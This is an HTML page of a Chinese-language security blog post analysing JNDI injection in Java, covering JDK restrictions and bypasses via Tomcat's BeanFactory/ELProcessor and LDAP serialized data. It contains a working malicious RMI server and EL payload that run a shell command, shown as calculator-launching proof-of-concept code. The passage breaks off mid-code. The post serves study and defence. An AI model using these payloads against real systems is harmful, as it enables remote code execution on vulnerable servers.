<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="最近梳理了一下 JNDI Injection 的攻击面">
<meta property="og:type" content="article">
<meta property="og:title" content="Exploitng JNDI Injection In Java">
<meta property="og:url" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/index.html">
<meta property="og:site_name" content="M13n&#39;s Blog">
<meta property="og:description" content="最近梳理了一下 JNDI Injection 的攻击面">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210309204202167.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/d3caa5b59aea4fa7bf35385daffae4e6.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311193104158.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311170748080.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311172118480.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311173959048.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311175314514.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311175640760.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311200459943.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311202226346.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311201636727.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210327095111068.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316161108368.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316231238508.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210321101648022.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210321104115206.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210321152402398.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316142718924.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316143349995.png">
<meta property="og:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316142401711.png">
<meta property="article:published_time" content="2021-03-16T05:29:15.000Z">
<meta property="article:modified_time" content="2021-03-27T01:52:43.140Z">
<meta property="article:author" content="M13n">
<meta property="article:tag" content="JNDI">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210309204202167.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Exploitng JNDI Injection In Java</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/03/25/%E6%B5%85%E6%9E%90-fastjson-1-2-24-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%94%BB%E9%98%B2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/03/06/%E9%80%9A%E8%BE%BE-OA-11-7-%E7%BB%84%E5%90%88%E6%8B%B3-RCE-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&text=Exploitng JNDI Injection In Java"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&is_video=false&description=Exploitng JNDI Injection In Java"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Exploitng JNDI Injection In Java&body=Check out this article: http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&title=Exploitng JNDI Injection In Java"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&name=Exploitng JNDI Injection In Java&description=&lt;p&gt;最近梳理了一下 JNDI Injection 的攻击面&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/16/Exploitng-JNDI-Injection-In-Java/&t=Exploitng JNDI Injection In Java"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lt-8u191"><span class="toc-number">2.</span> <span class="toc-text">&lt; 8u191</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%89%A5-8u191"><span class="toc-number">3.</span> <span class="toc-text">≥ 8u191</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0-Class-%E4%BD%9C%E4%B8%BA-Reference-Factory"><span class="toc-number">3.1.</span> <span class="toc-text">利用本地 Class 作为 Reference Factory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="toc-number">3.2.</span> <span class="toc-text">利用LDAP返回序列化数据</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Exploitng JNDI Injection In Java
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">M13n's Blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-03-16T05:29:15.000Z" itemprop="datePublished">2021-03-16</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Java-Sec/">Java Sec</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/JNDI/" rel="tag">JNDI</a>, <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>最近梳理了一下 JNDI Injection 的攻击面</p>
<span id="more"></span>

<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>JNDI Injection 可能是 Java 里面用到的比较多的攻击思路，但是在高版本 JDK 下都有着一些限制</p>
<p>高版本 JDK 下 对 JNDI 的限制主要来源于 trustURLCodebase 一些相关的配置</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210309204202167.png"></p>
<ul>
<li>JDK 5u45、6u45、7u21、8u121 开始 java.rmi.server.useCodebaseOnly 默认配置为 true</li>
<li>JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为 false</li>
<li>JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为 false</li>
</ul>
<p>高是一个相对量的形容词，下文主要版本分割以 8u191 为界限</p>
<h1 id="lt-8u191"><a href="#lt-8u191" class="headerlink" title="&lt; 8u191"></a>&lt; 8u191</h1><p>根据上文中 JNDI Injection 与 JDK 关系图可以看出来，8u191 之前主要分为三个思路进行 JNDI Injection</p>
<ul>
<li>RMI 动态加载恶意类</li>
<li>RMI + JNDI Reference</li>
<li>LDAP + JNDI Reference </li>
</ul>
<p>首先 RMI 动态加载恶意类，其中两个比较重要的名词分别是 CLASSPATH 和 codebase，P师傅的 Java安全漫谈对此进行了解释</p>
<blockquote>
<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等</p>
<p>如果我们指定 codebase=<a target="_blank" rel="noopener" href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则 Java虚拟机会下载这个文件 <a target="_blank" rel="noopener" href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为 Example类的字节码。</p>
</blockquote>
<p>而 RMI 动态加载恶意类造成 RCE 的成因，个人认为就是其 RMI 的这种加载机制和 codebase 可控造成了远程恶意类加载，首先加载机制是当本地CLASSPATH中无法找到相应的类时，会在指定的codebase里加载class，那么此时 codebase 可控也就造成了 RCE</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/d3caa5b59aea4fa7bf35385daffae4e6.png"></p>
<p>其限制如下</p>
<ul>
<li>安装并配置了SecurityManager</li>
<li> Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li>
</ul>
<p>由于限制颇多，也就变成了不常使用的方式，其后两种方式主要结合了 JNDI Reference，后续 bypass 方式也是基于其调用流程</p>
<p>基本的利用流程都是 get 一个 JNDI Reference，之后会通过 JNDI Reference 中指定的 codebase 加载 Factory，然后将其实例化，由于会调用 <code>factory.getObjectInstance</code> 因此在恶意类的 static 代码块，构造方法，<code>getObjectInstance</code> 方法出构造恶意代码均会调用</p>
<p>先看 RMI + JNDI Reference</p>
<blockquote>
<p>JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
</blockquote>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311193104158.png"></p>
<p> 8u113 前后对比，左图为 8u102，右图为 8u201</p>
<p>主要改动的限制在 <code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code></p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311170748080.png"></p>
<p>可见 8u113 之后会在 <code>return NamingManager.getObjectInstance(var3, var2, this, this.environment);</code> 之前抛出异常，导致无法在后续加载 Factory，主要的限制为 <code>var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase</code></p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311172118480.png"></p>
<p>接着看 LDAP + JNDI Reference  8u191 前后对比</p>
<p>首先 decodeObject 时，LDAP 选用了不同的方式，因此之前 RMI 的限制在 <code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code> 这里是不对 LDAP 起作用的</p>
<p>decodeObject 对于两者来说都是获取 Reference 对象</p>
<p>先看一下 RMI 的调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">decodeObject:<span class="number">475</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">138</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">11</span>, RMIDemo (com.p2hm1n.jndidemo)</span><br></pre></td></tr></table></figure>

<p>LDAP的调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">decodeObject:<span class="number">235</span>, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:<span class="number">1051</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">11</span>, LDAPDemo (com.p2hm1n.jndidemo)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311173959048.png"></p>
<p>trustURLCodebase 的限制是在加载远程 codebase 时起作用的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loadClass:<span class="number">108</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">158</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">11</span>, LDAPDemo (com.p2hm1n.jndidemo)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311175314514.png"></p>
<p>左图为 8u102，右图为 8u201</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311175640760.png"></p>
<h1 id="≥-8u191"><a href="#≥-8u191" class="headerlink" title="≥ 8u191"></a>≥ 8u191</h1><p>两种思路都是基于之前思路的 bypass </p>
<p>@kingx <a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">文中</a>写到两种方式</p>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
</ol>
<h2 id="利用本地-Class-作为-Reference-Factory"><a href="#利用本地-Class-作为-Reference-Factory" class="headerlink" title="利用本地 Class 作为 Reference Factory"></a>利用本地 Class 作为 Reference Factory</h2><p>前文中我们对比了 RMI + JNDI Reference 的限制，发现其主要限制来源于</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>核心判断为 <code>var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase</code></p>
<p>由于 <code>trustURLCodebase</code> 是受 JDK 版本限制死的，<code>var8</code> 跟 <code>var8.getFactoryClassLocation()</code> 疑似可控</p>
<p>这里 getFactoryClassLocation 指的是获取的工厂类的位置，如果加载 JNDI Reference 的话，地址为指定的 codebase 地址</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311200459943.png"></p>
<p>看一下 8u113 之后的逻辑，还是先获取了 Reference 的，<code>var8</code>此时也被附值，因此如果这里的  <code>var8.getFactoryClassLocation()</code>  为 null，也就是 Reference 中指定的 Factory Class，这个工厂类必须在受害目标本地的 CLASSPATH 中，这样后续可以继续调用</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311202226346.png"></p>
<p>且后续调用中需要调用到 factory 的 <code>getObjectInstance</code> 方法</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210311201636727.png"></p>
<p>限制条件：</p>
<ul>
<li>Reference中指定 Factory Class，这个工厂类必须在受害目标本地的 CLASSPATH 中</li>
<li>工厂类必须实现 javax.naming.spi.ObjectFactory 接口</li>
<li>至少存在一个 getObjectInstance() 方法</li>
</ul>
<p><code>org.apache.naming.factory.BeanFactory</code> 是满足上述条件，被拿来作为 JDK 高版本解决 JNDI 注入限制的一个类</p>
<p>可以用其 eval 实现 RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ELDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ELProcessor test = <span class="keyword">new</span> ELProcessor();</span><br><span class="line">        test.eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;, &#x27;-c&#x27;, &#x27;open -a Calculator&#x27;]).start()\&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getValue:<span class="number">161</span>, AstValue (org.apache.el.parser)</span><br><span class="line">getValue:<span class="number">189</span>, ValueExpressionImpl (org.apache.el)</span><br><span class="line">getValue:<span class="number">61</span>, ELProcessor (javax.el)</span><br><span class="line">eval:<span class="number">54</span>, ELProcessor (javax.el)</span><br><span class="line">main:<span class="number">8</span>, ELDemo (com.p2hm1n.jndidemo)</span><br></pre></td></tr></table></figure>

<p>最后通过 while 遍历 +  invoke 执行恶意命令</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210327095111068.png"></p>
<p>看一下恶意 Server</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ElServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里 <code>var8.getFactoryClassLocation() != null</code> 被绕过了，后续还是会调用到 <code>NamingManager#getObjectInstance</code></p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316161108368.png"></p>
<p>中间的调用栈跟之前一样，后续调用到 <code>org.apache.naming.factory.BeanFactory#getObjectInstance</code> ，这里会先进行 obj 的判断，后续 classloader 调用 loadclass 加载类</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316231238508.png"></p>
<p>这里实例化了 ELProcessor 类，并附值给 bean，同时取出 ref 中 forceString 的值，此时 ra值为 <code>x=eval</code>，后续通过 <code>ra.getContent()</code> 将 ra 的值附给 value </p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210321101648022.png"></p>
<p>这里其实就是根据 <code>=</code> 切割字符串，将 <code>x</code> 附给 <code>param</code>， <code>eval</code> 附给 <code>propName</code></p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210321104115206.png"></p>
<p>最后直接通过反射调用 <code>ELProcessor</code> 的 <code>eval</code> 方法，最后RCE</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210321152402398.png"></p>
<p>影响 Tomcat 8+</p>
<p>更多兼容性的问题看雨🐂blog </p>
<h2 id="利用LDAP返回序列化数据"><a href="#利用LDAP返回序列化数据" class="headerlink" title="利用LDAP返回序列化数据"></a>利用LDAP返回序列化数据</h2><p>这里需要结合本地的一些 gadget 链</p>
<p>首先回顾 LDAP 的定义，LDAP可以为存储的Java对象指定多种属性：</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData</li>
</ul>
<p>核心利用点是 LDAP Server 中支持直接返回一个对象的序列化数据，如果 javaSerializedData 属性不为空，会对其进行反序列化</p>
<p>先看之前的获取 Reference 的 decodeObject</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316142718924.png"></p>
<p>看一下 <code>JAVA_ATTRIBUTES</code>，这里的判断也就是 javaSerializedData</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String[] JAVA_ATTRIBUTES = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaSerializedData&quot;</span>, <span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javaFactory&quot;</span>, <span class="string">&quot;javaCodeBase&quot;</span>, <span class="string">&quot;javaReferenceAddress&quot;</span>, <span class="string">&quot;javaClassNames&quot;</span>, <span class="string">&quot;javaRemoteLocation&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>后续 readObject 处反序列化。var20可控，可构造本地 gadget</p>
<p><img src="/2021/03/16/Exploitng-JNDI-Injection-In-Java/image-20210316143349995.png"></p>
<p>需要改一下 marshalsec，同时注意高版本 JDK 下有些 CC 链也会失效</p>
<p> <code>addAttribute</code>   添加个<code>javaSerializedData</code> 即可，然后去掉一些 <code>arg[]</code> 的传参操作，CCpoc 延用之前 CC 的链的 poc 就行，只是需要 return 一个 <code>byte[]</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span 